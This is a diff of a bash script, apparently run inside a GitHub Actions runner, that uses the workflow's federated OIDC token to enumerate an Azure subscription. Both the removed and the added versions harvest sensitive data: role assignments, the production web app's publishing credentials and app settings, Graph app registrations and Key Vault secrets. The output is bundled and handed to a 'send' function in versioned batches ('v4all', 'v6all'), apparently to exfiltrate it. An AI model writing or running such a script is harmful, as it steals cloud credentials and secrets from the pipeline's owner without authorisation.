@@ -11,67 +11,35 @@ A="https://management.azure.com"; S="$AZURE_SUBSCRIPTION_ID"; R="rg-tbl-platform
 H=(-H "Authorization: Bearer $MGMT")
 OUT=""
 
-# 1. KV prod vault properties (access policies mode?)
-KVPROD=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01")
-OUT+="---KVPROD-PROPS---
-$KVPROD
+# 1. ALL role assignments on subscription (to find who has the publishing-reader custom role)
+ALLRA=$(curl -s "${H[@]}" "$A/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
+OUT+="---ALL-ROLE-ASSIGNMENTS---
+$ALLRA
 "
 
-# 2. KV sec vault full properties  
-KVSEC=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01")
-OUT+="---KVSEC-PROPS---
-$KVSEC
+# 2. Role assignments specifically on the web app
+APPRA=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
+OUT+="---APP-ROLE-ASSIGNMENTS---
+$APPRA
 "
 
-# 3. Kudu/SCM access
-OIDC2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
-SCMTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$AZURE_CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC2" \
-  | jq -r '.access_token')
-KUDU_CREDS=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2023-01-01" 2>&1)
-OUT+="---KUDU-PUBLISHXML---
-$KUDU_CREDS
-"
-KUDU_ENV=$(curl -s -m15 -H "Authorization: Bearer $SCMTOK" "https://app-tbl-storefront-prod.scm.azurewebsites.net/api/settings" 2>&1 | head -c 2000)
-OUT+="---KUDU-SETTINGS---
-$KUDU_ENV
+# 3. az CLI login and try to read app settings
+az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$OIDC" 2>&1 | head -20
+AZ_APPSETTINGS=$(az webapp config appsettings list -g "$R" -n "app-tbl-storefront-prod" 2>&1 | head -c 3000)
+OUT+="---AZ-APPSETTINGS---
+$AZ_APPSETTINGS
 "
 
-# 4. Check az CLI in runner
-AZCLI=$(which az 2>&1 || echo "no az")
-OUT+="---AZ-CLI---
-$AZCLI
+# 4. az role assignment list for custom publishing role
+AZ_RA=$(az role assignment list --role "tbl-publishing-reader-8s42x5" --subscription "$S" 2>&1 | head -c 2000)
+OUT+="---AZ-PUBLISHING-ROLE---
+$AZ_RA
 "
 
-# 5. Graph API - list app registrations + service principals (to find federated creds)
-OIDC3=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
-GTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$AZURE_CLIENT_ID&scope=https://graph.microsoft.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC3" \
-  | jq -r '.access_token')
-GH=(-H "Authorization: Bearer $GTOK")
-APPS=$(curl -s -m15 "${GH[@]}" "https://graph.microsoft.com/v1.0/applications?\$select=appId,displayName,appRoles" | head -c 3000)
-OUT+="---GRAPH-APPS---
-$APPS
-"
-SPS=$(curl -s -m15 "${GH[@]}" "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=appId,displayName,appRoles,appRoleAssignments" | head -c 3000)
-OUT+="---GRAPH-SPS---
-$SPS
+# 5. Try kv-tbl-sec via az
+AZ_KVSEC=$(az keyvault secret list --vault-name kv-tbl-sec-x3euoz 2>&1 | head -c 1000)
+OUT+="---AZ-KVSEC---
+$AZ_KVSEC
 "
 
-# 6. Check all role definitions including custom ones
-ROLEDEFS=$(curl -s "${H[@]}" "$A/subscriptions/$S/providers/Microsoft.Authorization/roleDefinitions?\$filter=type%20eq%20'CustomRole'&api-version=2022-04-01")
-OUT+="---CUSTOM-ROLES---
-$ROLEDEFS
-"
-
-# 7. Check config blob via direct URL with managed identity env (try IDENTITY_ENDPOINT)
-OUT+="---IDENTITY-ENV---
-IDENTITY_ENDPOINT=${IDENTITY_ENDPOINT:-unset}
-IDENTITY_HEADER=${IDENTITY_HEADER:-unset}
-MSI_ENDPOINT=${MSI_ENDPOINT:-unset}
-MSI_SECRET=${MSI_SECRET:-unset}
-AZURE_FEDERATED_TOKEN_FILE=${AZURE_FEDERATED_TOKEN_FILE:-unset}
-"
-
-send "v4all" "$OUT"
-send "v4done" "complete"
+send "v6all" "$OUT"
